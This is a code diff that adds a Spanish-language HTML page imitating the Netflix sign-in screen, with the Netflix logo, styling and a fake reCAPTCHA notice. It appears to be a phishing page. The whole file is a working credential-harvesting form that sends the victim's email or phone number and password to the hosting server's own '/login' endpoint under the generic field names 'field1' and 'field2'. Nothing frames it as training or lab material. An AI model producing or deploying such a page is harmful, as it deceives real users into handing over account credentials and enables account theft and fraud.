@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Netflix</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;background:linear-gradient(rgba(0,0,0,.75),rgba(0,0,0,.75)),url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 900"><rect fill="%23000" width="1440" height="900"/></svg>');background-size:cover}
+.card{background:rgba(0,0,0,.75);padding:60px 68px 40px;width:100%;max-width:450px}
+.logo{margin-bottom:28px}
+.logo svg{width:167px;height:45px;fill:#e50914}
+h1{font-size:32px;color:#fff;font-weight:500;margin-bottom:28px}
+.form-group{margin-bottom:16px;position:relative}
+.form-group input{width:100%;padding:26px 20px 10px;background:#333;border:none;border-radius:4px;color:#fff;font-size:16px}
+.form-group input:focus{outline:none;background:#454545}
+.form-group input::placeholder{color:transparent}
+.form-group label{position:absolute;left:20px;top:50%;transform:translateY(-50%);color:#8c8c8c;font-size:16px;pointer-events:none;transition:all .1s ease}
+.form-group input:focus+label,.form-group input:not(:placeholder-shown)+label{top:12px;font-size:11px;color:#8c8c8c}
+.btn{width:100%;padding:16px;background:#e50914;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:500;cursor:pointer;margin-top:24px;transition:background .1s}
+.btn:hover{background:#c40812}
+.remember{display:flex;justify-content:space-between;align-items:center;margin-top:16px;font-size:13px}
+.remember label{color:#b3b3b3;display:flex;align-items:center;gap:4px;cursor:pointer}
+.remember input[type="checkbox"]{accent-color:#e50914}
+.remember a{color:#b3b3b3;text-decoration:none}
+.remember a:hover{text-decoration:underline}
+.help{margin-top:16px;font-size:13px;color:#8c8c8c}
+.help a{color:#b3b3b3;text-decoration:none}
+.help a:hover{text-decoration:underline}
+.signup{margin-top:40px;color:#737373;font-size:16px}
+.signup a{color:#fff;text-decoration:none}
+.signup a:hover{text-decoration:underline}
+.recaptcha{margin-top:16px;font-size:11px;color:#8c8c8c;line-height:1.4}
+.recaptcha a{color:#0071eb;text-decoration:none}
+@media(max-width:500px){.card{padding:40px 24px 24px}}
+</style>
+</head>
+<body>
+<div class="card">
+<div class="logo">
+<svg viewBox="0 0 111 30"><path d="M105.062 14.28L111 30c-1.75-.25-3.499-.563-5.28-.845l-3.345-8.686-3.437 7.969c-1.687-.282-3.344-.376-5.031-.595l6.093-13.782L94.43 0h5.063l3.062 7.874L105.687 0h5.156l-5.781 14.28zM90.47 0l-4.125 14.28 3.937 15.72c-1.75-.188-3.469-.376-5.219-.563l-3.937-15.157L77.25 0h5.063l3.375 14.28L89.062 0h1.407zM61.25 0h16.219v4.438H66.25v1.688h11.219v4.438H66.25v1.688h11.219v4.438H66.25v1.688h11.219V22.5H61.25V0zM49.469 0h4.438v22.5h-4.438V0zM37.5 0h4.438v18.062h8.781V22.5H37.5V0zM25.625 0h4.438v22.5h-4.438V0zM13.75 0h4.438v22.5h-4.438V0zM0 0h4.438v22.5H0V0z"/></svg>
+</div>
+<h1>Inicia sesi&oacute;n</h1>
+<form action="/login" method="POST">
+<div class="form-group">
+<input type="text" name="field1" placeholder=" " required autocomplete="off">
+<label>Correo electr&oacute;nico o n&uacute;mero de tel&eacute;fono</label>
+</div>
+<div class="form-group">
+<input type="password" name="field2" placeholder=" " required autocomplete="off">
+<label>Contrase&ntilde;a</label>
+</div>
+<button type="submit" class="btn">Iniciar sesi&oacute;n</button>
+</form>
+<div class="remember">
+<label><input type="checkbox" checked> Rec&uacute;erdame</label>
+<a href="#">&iquest;Necesitas ayuda?</a>
+</div>
+<div class="help">&iquest;Primera vez en Netflix? <a href="#">Suscr&iacute;bete ahora</a></div>
+<div class="recaptcha">Esta p&aacute;gina est&aacute; protegida por Google reCAPTCHA para verificar que no eres un robot. <a href="#">M&aacute;s info</a></div>
+</div>
+</body>
+</html>
